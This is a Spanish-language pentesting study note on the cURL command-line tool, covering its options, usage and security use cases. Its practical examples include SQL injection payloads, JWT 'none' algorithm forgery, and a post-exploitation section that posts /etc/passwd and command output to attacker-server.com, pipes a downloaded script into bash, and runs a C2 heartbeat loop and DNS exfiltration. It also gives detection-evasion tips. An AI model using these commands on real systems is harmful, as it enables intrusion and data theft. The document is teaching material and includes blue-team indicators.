---
Tema: "[[apuntes/herramientas/herramientas|herramientas]]"
---
# 🌐 cURL: Cliente HTTP/HTTPS de Línea de Comandos

> [!info] Herramienta fundamental de pentesting
> **cURL** (Client URL) es una herramienta de línea de comandos y biblioteca para transferir datos con servidores, soportando múltiples protocolos como HTTP, HTTPS, FTP, SFTP, SCP y muchos más. Es indispensable en pentesting web, automatización de ataques, exfiltración de datos y análisis de APIs.

---

## 📋 Tabla de Contenidos
- [Introducción](#introducción)
- [Instalación](#instalación)
- [Sintaxis Básica](#sintaxis-básica)
- [Parámetros y Opciones Principales](#parámetros-y-opciones-principales)
- [Casos de Uso en Ciberseguridad](#casos-de-uso-en-ciberseguridad)
- [Ejemplos Prácticos](#ejemplos-prácticos)
- [Tips y Buenas Prácticas](#tips-y-buenas-prácticas)

---

## 📝 Introducción

### ¿Qué es cURL?

cURL es una herramienta que permite enviar y recibir datos desde servidores usando una amplia variedad de protocolos. Su versatilidad y capacidad de scripting la convierten en una herramienta esencial para pentesters, desarrolladores y administradores de sistemas.

### ¿Para qué sirve?

- **Testing de APIs**: Enviar requests HTTP con diferentes métodos y headers
- **Web scraping**: Automatizar descargas y extracción de contenido
- **Bypass de restricciones**: Evadir filtros y controles de acceso
- **Exfiltración de datos**: Transferir información desde sistemas comprometidos
- **Automatización de ataques**: Integrar en scripts de pentesting
- **Análisis de respuestas**: Debuggear aplicaciones web y APIs

### Contextos de uso en ciberseguridad

```mermaid
graph TD
    A[cURL en Ciberseguridad] --> B[Pentesting Web]
    A --> C[API Testing]
    A --> D[Data Exfiltration]
    A --> E[Automation]
    
    B --> B1[SQL Injection]
    B --> B2[XSS Testing]
    B --> B3[Authentication Bypass]
    
    C --> C1[Endpoint Discovery]
    C --> C2[Parameter Fuzzing]
    C --> C3[JWT Testing]
    
    D --> D1[File Transfer]
    D --> D2[Command Results]
    D --> D3[Credential Harvesting]
    
    E --> E1[Scripted Attacks]
    E --> E2[Payload Delivery]
    E --> E3[Post-Exploitation]
```

---

## 💾 Instalación

### Verificar instalación

```bash
# cURL viene preinstalado en la mayoría de sistemas
curl --version
```

### Instalación en diferentes sistemas

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install curl

# CentOS/RHEL/Fedora
sudo yum install curl
# o en versiones nuevas
sudo dnf install curl

# macOS (usando Homebrew)
brew install curl

# Windows (usando Chocolatey)
choco install curl
```

---

## 🖥️ Sintaxis Básica

### Formato general

```bash
curl [opciones] [URL]
```

### Uso básico

```bash
# GET request simple
curl https://example.com

# Guardar respuesta en archivo
curl https://example.com -o output.html

# Mostrar headers de respuesta
curl -I https://example.com

# Seguir redirects
curl -L https://example.com
```

> [!example] Request básico
> ```bash
> curl https://httpbin.org/get
> ```
> Este comando realiza un GET request simple y muestra la respuesta JSON con información sobre la petición.

---

## ⚙️ Parámetros y Opciones Principales

### Opciones de output y verbosidad

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-o, --output` | Guardar output en archivo | `curl -o page.html https://example.com` |
| `-O` | Guardar con nombre del archivo remoto | `curl -O https://example.com/file.pdf` |
| `-s, --silent` | Modo silencioso (sin progress bar) | `curl -s https://api.example.com` |
| `-v, --verbose` | Mostrar detalles de la comunicación | `curl -v https://example.com` |
| `-I, --head` | Solo headers HTTP (método HEAD) | `curl -I https://example.com` |
| `-i, --include` | Incluir headers en la salida | `curl -i https://example.com` |

### Opciones de métodos HTTP

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-X, --request` | Especificar método HTTP | `curl -X POST https://api.example.com` |
| `-d, --data` | Enviar datos POST | `curl -d "user=admin&pass=123" https://login.com` |
| `-F, --form` | Enviar formulario multipart | `curl -F "file=@document.pdf" https://upload.com` |
| `-G, --get` | Convertir datos POST a GET | `curl -G -d "q=search" https://example.com` |

### Opciones de headers y autenticación

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-H, --header` | Agregar header personalizado | `curl -H "Authorization: Bearer token" https://api.com` |
| `-A, --user-agent` | Establecer User-Agent | `curl -A "Mozilla/5.0..." https://example.com` |
| `-e, --referer` | Establecer Referer | `curl -e "https://google.com" https://example.com` |
| `-u, --user` | Autenticación básica | `curl -u username:password https://secure.com` |
| `-b, --cookie` | Enviar cookies | `curl -b "session=abc123" https://example.com` |
| `-c, --cookie-jar` | Guardar cookies | `curl -c cookies.txt https://example.com` |

### Opciones de conexión y SSL

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-k, --insecure` | Ignorar errores SSL | `curl -k https://self-signed.com` |
| `-L, --location` | Seguir redirects | `curl -L https://bit.ly/shorturl` |
| `--connect-timeout` | Timeout de conexión | `curl --connect-timeout 10 https://slow.com` |
| `--max-time` | Timeout total | `curl --max-time 30 https://example.com` |
| `-x, --proxy` | Usar proxy | `curl -x http://proxy:8080 https://example.com` |

---

## 🎯 Casos de Uso en Ciberseguridad

### 1. Pentesting de aplicaciones web

- Testing de SQL injection en parámetros
- Pruebas de XSS con payloads personalizados
- Bypass de autenticación y autorización
- Fuzzing de parámetros y endpoints

### 2. Análisis y testing de APIs

- Descubrimiento de endpoints
- Testing de autenticación JWT
- Enumeración de métodos HTTP permitidos
- Validación de input y output

### 3. Post-explotación y exfiltración

- Transferencia de archivos desde sistemas comprometidos
- Envío de resultados de comandos a servidores C2
- Descarga de herramientas y payloads
- Comunicación con servidores de atacantes

### 4. Automatización de ataques

- Integración en scripts de bash/python
- Ataques de fuerza bruta contra formularios
- Automatización de workflows de pentesting
- Testing masivo de vulnerabilidades

---

## 💻 Ejemplos Prácticos

### Ejemplo 1: Testing de SQL Injection en formulario de login

```bash
# Test básico de SQL injection
curl -X POST -d "username=admin' OR '1'='1&password=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     https://vulnerable-app.com/login

# Test con time-based SQL injection
curl -X POST -d "username=admin' AND (SELECT SLEEP(5))--&password=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w "Time: %{time_total}s\n" \
     https://vulnerable-app.com/login

# Test con diferentes payloads
for payload in "admin' OR '1'='1" "admin' UNION SELECT 1,2,3--" "admin'; DROP TABLE users--"; do
    echo "Testing payload: $payload"
    curl -s -X POST -d "username=$payload&password=test" \
         -H "Content-Type: application/x-www-form-urlencoded" \
         https://vulnerable-app.com/login | grep -i "error\|success\|welcome"
done
```

> [!info] Explicación
> Este ejemplo demuestra testing de SQL injection:
> 1. **Primer comando**: Prueba un payload básico de bypass de autenticación
> 2. **Segundo comando**: Testing de time-based injection midiendo el tiempo de respuesta
> 3. **Tercer comando**: Automatiza el testing con múltiples payloads
> 
> La opción `-w "Time: %{time_total}s\n"` muestra el tiempo total de la request, útil para detectar time-based attacks.

### Ejemplo 2: API enumeration y JWT token testing

```bash
# Descubrir endpoints de API
endpoints=("users" "admin" "config" "debug" "api/v1" "api/v2")
base_url="https://api.target.com"

for endpoint in "${endpoints[@]}"; do
    echo "Testing endpoint: /$endpoint"
    response=$(curl -s -w "%{http_code}" -o /dev/null "$base_url/$endpoint")
    echo "Status: $response"
    
    # Si encontramos un endpoint válido, probamos diferentes métodos
    if [[ $response == "200" ]]; then
        echo "Found valid endpoint: $endpoint"
        for method in GET POST PUT DELETE PATCH; do
            status=$(curl -s -w "%{http_code}" -o /dev/null -X $method "$base_url/$endpoint")
            echo "  $method: $status"
        done
    fi
done

# Testing JWT token manipulation
jwt_token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Test con token válido
curl -H "Authorization: Bearer $jwt_token" \
     -H "Content-Type: application/json" \
     https://api.target.com/profile

# Test con token manipulado (cambiar algoritmo a none)
manipulated_token="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
curl -H "Authorization: Bearer $manipulated_token" \
     -H "Content-Type: application/json" \
     https://api.target.com/admin
```

> [!info] Explicación
> Este ejemplo muestra enumeración de APIs y testing de JWT:
> 1. **Primera parte**: Automatiza el descubrimiento de endpoints probando diferentes rutas
> 2. **Para endpoints válidos**: Prueba diferentes métodos HTTP para ver qué está permitido
> 3. **Testing JWT**: Prueba manipulación de tokens JWT cambiando el algoritmo a "none"
> 
> La opción `-w "%{http_code}"` obtiene solo el código de respuesta HTTP, útil para automatización.

### Ejemplo 3: Post-explotación y exfiltración de datos

```bash
# Exfiltrar archivo del sistema comprometido
# En el sistema comprometido:
curl -X POST -F "file=@/etc/passwd" \
     -H "User-Agent: Mozilla/5.0 (compatible; UpdateChecker)" \
     https://attacker-server.com/upload

# Enviar output de comandos vía POST
command_output=$(ps aux | head -20)
curl -X POST -d "data=$(echo "$command_output" | base64)" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     https://attacker-server.com/receive

# Descarga silenciosa de herramientas
curl -s https://attacker-server.com/tools/linpeas.sh | bash

# Establecer comunicación persistente (heartbeat)
while true; do
    hostname=$(hostname)
    uptime=$(uptime)
    curl -s -X POST \
         -d "host=$hostname&status=$uptime&timestamp=$(date +%s)" \
         https://attacker-server.com/heartbeat
    sleep 300  # Cada 5 minutos
done &

# Exfiltración de datos por DNS (si HTTP está bloqueado)
data="sensitive_data_here"
encoded_data=$(echo "$data" | base64 | tr -d '\n' | tr '+/' '-_')
curl -s "https://dns-exfil.$encoded_data.attacker-domain.com" > /dev/null
```

> [!info] Explicación
> Este ejemplo muestra técnicas de post-explotación:
> 1. **Exfiltración de archivos**: Envía archivos sensibles como `/etc/passwd` al servidor del atacante
> 2. **Envío de output**: Codifica en base64 la salida de comandos para enviarla
> 3. **Descarga de herramientas**: Descarga y ejecuta scripts de enumeración directamente
> 4. **Heartbeat**: Mantiene comunicación periódica con el servidor C2
> 5. **DNS exfiltration**: Método alternativo cuando HTTP está bloqueado
> 
> Usar User-Agent personalizado ayuda a evadir detección básica.

---

## 💡 Tips y Buenas Prácticas

### Optimización y evasión

```mermaid
graph TD
    A[Optimización cURL] --> B[Velocidad]
    A --> C[Stealth]
    A --> D[Confiabilidad]
    
    B --> B1[Conexiones paralelas]
    B --> B2[Timeouts apropiados]
    B --> B3[Keep-alive]
    
    C --> C1[User-Agent realista]
    C --> C2[Headers comunes]
    C --> C3[Timing aleatorio]
    
    D --> D1[Manejo de errores]
    D --> D2[Retry logic]
    D --> D3[Logging detallado]
```

> [!tip] Mejores prácticas para pentesting
> **Evasión de detección:**
> - Usar User-Agents realistas: `-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
> - Agregar headers comunes: `-H "Accept: text/html,application/xhtml+xml"`
> - Variar timing entre requests para evitar rate limiting
> - Usar proxies cuando sea necesario: `-x http://proxy:8080`
> 
> **Optimización de rendimiento:**
> - Usar `-s` para modo silencioso en scripts
> - Establecer timeouts apropiados: `--connect-timeout 5 --max-time 10`
> - Reutilizar conexiones con `-b cookies.txt -c cookies.txt`

### Configuración avanzada

```bash
# Archivo de configuración .curlrc
# Ubicar en ~/.curlrc para configuración global
cat > ~/.curlrc << 'EOF'
# Seguir redirects automáticamente
location
# Timeout de conexión de 10 segundos
connect-timeout = 10
# Timeout total de 30 segundos
max-time = 30
# User-Agent por defecto
user-agent = "Mozilla/5.0 (compatible; Security-Scanner)"
# Comprimir respuestas automáticamente
compressed
EOF

# Script wrapper para cURL con logging
curl_with_log() {
    local url="$1"
    local method="${2:-GET}"
    local logfile="/tmp/curl_$(date +%s).log"
    
    echo "$(date): $method $url" >> "$logfile"
    
    curl -w "\nTime: %{time_total}s\nSize: %{size_download} bytes\nStatus: %{http_code}\n" \
         -X "$method" \
         -v \
         "$url" 2>> "$logfile"
    
    echo "Log saved to: $logfile"
}
```

### Errores comunes y soluciones

| Error | Causa | Solución |
|-------|-------|----------|
| SSL certificate error | Certificado autofirmado o inválido | Usar `-k` o `--insecure` |
| Connection timeout | Servidor lento o inaccesible | Aumentar `--connect-timeout` |
| HTTP 403/401 | Falta autenticación | Agregar `-u user:pass` o headers de auth |
| Data not sent correctly | Formato incorrecto | Verificar `-H "Content-Type: ..."` |
| Cookie issues | Cookies no persistentes | Usar `-b cookies.txt -c cookies.txt` |
| Redirect loops | Demasiados redirects | Limitar con `--max-redirs 5` |

### Debugging y troubleshooting

```bash
# Debug completo de request/response
curl -v -s -o response.html -w "@curl-format.txt" https://example.com

# Crear archivo de formato para debugging
cat > curl-format.txt << 'EOF'
     time_namelookup:  %{time_namelookup}s\n
        time_connect:  %{time_connect}s\n
     time_appconnect:  %{time_appconnect}s\n
    time_pretransfer:  %{time_pretransfer}s\n
       time_redirect:  %{time_redirect}s\n
  time_starttransfer:  %{time_starttransfer}s\n
                     ----------\n
          time_total:  %{time_total}s\n
         size_upload:  %{size_upload} bytes\n
       size_download:  %{size_download} bytes\n
      speed_download:  %{speed_download} bytes/s\n
         speed_upload:  %{speed_upload} bytes/s\n
            http_code:  %{http_code}\n
EOF

# Trace completo de la conexión
curl --trace trace.log --trace-time https://example.com
```

---

## 📊 Comparación con otras herramientas

| Herramienta | Ventajas | Desventajas | Mejor para |
|-------------|----------|-------------|------------|
| **cURL** | Versátil, scriptable, amplio soporte de protocolos | Solo línea de comandos | Automatización, scripting |
| **wget** | Bueno para descargas recursivas | Menos opciones HTTP | Descarga de sitios completos |
| **Postman** | GUI intuitiva, colecciones | No scriptable fácilmente | Testing manual de APIs |
| **Burp Suite** | Proxy interceptor, scanner | Comercial, complejo | Pentesting web completo |
| **HTTPie** | Sintaxis más simple | Menos funcionalidades | Testing rápido e interactivo |

---

## 🔗 Comandos de referencia rápida

```bash
# Requests básicos
curl https://example.com                    # GET simple
curl -X POST -d "data=value" https://api.com  # POST con datos
curl -I https://example.com                 # Solo headers

# Con autenticación
curl -u user:pass https://secure.com       # Basic auth
curl -H "Authorization: Bearer token" https://api.com  # Bearer token

# Handling redirects y cookies
curl -L -c cookies.txt -b cookies.txt https://example.com

# Output y debugging
curl -o output.html -v https://example.com # Guardar y debug
curl -s https://api.com | jq               # Silent + JSON parsing

# Timeouts y retry
curl --connect-timeout 5 --max-time 10 --retry 3 https://example.com
```

---

## 🛡️ Consideraciones de seguridad

> [!warning] Uso responsable
> - Usar solo en sistemas propios o con autorización explícita
> - No enviar credenciales reales en entornos de testing
> - Ser consciente de rate limiting y no sobrecargar servidores
> - Limpiar logs que puedan contener información sensible

> [!note] Para Blue Team
> **Indicadores de uso malicioso de cURL:**
> - User-Agents inusuales o automatizados
> - Patrones de request repetitivos o de alta frecuencia
> - Requests con payloads sospechosos (SQL injection, XSS)
> - Exfiltración de datos via POST con contenido codificado
> - Conexiones a dominios sospechosos o recién registrados

---

## 📚 Recursos adicionales

- Manual oficial: `man curl`
- Documentación online: [curl.se](https://curl.se/docs/)
- Testing playground: [httpbin.org](https://httpbin.org)
- JSON parsing: usar con `jq` para parsear respuestas JSON
- Automatización: integrar con `bash`, `python` o herramientas de CI/CD

> [!success] Puntos clave para recordar
> - **cURL es extremadamente versátil** para cualquier protocolo web
> - **Ideal para automatización** de pentesting y post-explotación
> - **Combinar con otras herramientas** como `jq`, `grep`, `awk` maximiza su potencial
> - **Usar configuraciones apropiadas** para cada contexto (stealth, debugging, etc.)
> - **La práctica constante** es clave para dominar sus múltiples opciones